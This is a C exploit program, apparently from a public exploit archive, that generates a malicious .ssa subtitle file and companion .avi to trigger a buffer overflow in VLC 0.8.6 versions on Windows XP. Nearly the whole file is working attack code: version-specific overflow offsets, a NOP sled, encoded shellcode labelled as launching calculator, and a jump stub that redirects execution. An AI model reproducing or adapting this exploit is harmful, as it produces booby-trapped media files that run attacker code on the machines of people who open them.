/*
VLC <=0.8.6.e
Subtitle parsing local buffer overflow exploit
Creadit to cuongmx@gmail.com vs Look2Me @
Tested on windows XP Pro SP2

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char ssa_header[]=
"[Script Info]\r\n"
"Title: VLC <= 0.8.6c,e buffer-overflow\r\n"
"ScriptType: v4.00\r\n"
"Collisions: Normal\r\n"
"[V4 Styles]\r\n"
"[Events]\r\n"
"Dialogue:";

// execute calculator from Meta
char shellcode[] =
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3d"
"\xba\xb1\xd9\x83\xeb\xfc\xe2\xf4\xc1\x52\xf5\xd9\x3d\xba\x3a\x9c"
"\x01\x31\xcd\xdc\x45\xbb\x5e\x52\x72\xa2\x3a\x86\x1d\xbb\x5a\x90"
"\xb6\x8e\x3a\xd8\xd3\x8b\x71\x40\x91\x3e\x71\xad\x3a\x7b\x7b\xd4"
"\x3c\x78\x5a\x2d\x06\xee\x95\xdd\x48\x5f\x3a\x86\x19\xbb\x5a\xbf"
"\xb6\xb6\xfa\x52\x62\xa6\xb0\x32\xb6\xa6\x3a\xd8\xd6\x33\xed\xfd"
"\x39\x79\x80\x19\x59\x31\xf1\xe9\xb8\x7a\xc9\xd5\xb6\xfa\xbd\x52"
"\x4d\xa6\x1c\x52\x55\xb2\x5a\xd0\xb6\x3a\x01\xd9\x3d\xba\x3a\xb1"
"\x01\xe5\x80\x2f\x5d\xec\x38\x21\xbe\x7a\xca\x89\x55\xc4\x69\x3b"
"\x4e\xd2\x29\x27\xb7\xb4\xe6\x26\xda\xd9\xd0\xb5\x5e\xba\xb1\xd9";

char szJMP[]=
"\x90\x90\xe9\x38\xff\xff\xff\xeb\xf9\x90\x90\x0b\x0b\x38\x00";

char szAVI[]=
"\x52\x49\x46\x46\xC\x0\x0\x0\x41\x56\x49\x20\x4C\x49\x53\x54\x00\x00\x00";

main()
{
    int i,j,k;
    printf("Give me your VLC version:\r\n");
    printf("1> version 8.06.c\r\n");
    printf("2> version 8.06.d\r\n");
    printf("3> version 8.06.e\r\nChose:");
    j=getchar();
    switch(j)
    {
        case '1': k=165254;break;
        case '2': printf("\r\nI haven't got this version!\r\n Good Luck :-)");
                  getchar();
                  return 0;break;
        case '3': k=165286;break;
    }
    k=k-sizeof(shellcode);
    printf("\r\n[+] Creating .ssa file ...");
    FILE*    f;
    char    szBuffer[170000];
    char    szBuffer2[200];

    strcpy(szBuffer,ssa_header);    // header of ssa
    
    memset((szBuffer+sizeof(ssa_header)-1),'\x90',k);
    szBuffer[k+sizeof(ssa_header)]='\x00';
    strcpy(szBuffer2,shellcode);
    strcat(szBuffer2,szJMP);
    strcat(szBuffer,szBuffer2);
    
    f=fopen("Bof-VLC.ssa","wb");
    if(f==NULL)
    {
        printf("Can't create file");
        exit;
    }
    fwrite(szBuffer,1,strlen(szBuffer),f);  // write header
    fclose(f);
    printf("\r\n[+] .ssa file successfully create!");
	
	printf("\r\n[+] Creation .avi file ...");
    f=fopen("Bof-VLC.avi","wb");
    if(f==NULL)
    {
        printf("Can't create file");
        exit;
    }
    fwrite(szAVI,1,sizeof(szAVI),f);  // write header
    fclose(f);	
    printf("\r\n[+] .avi file successfully create!");
    getchar();
}

// milw0rm.com [2008-03-14]
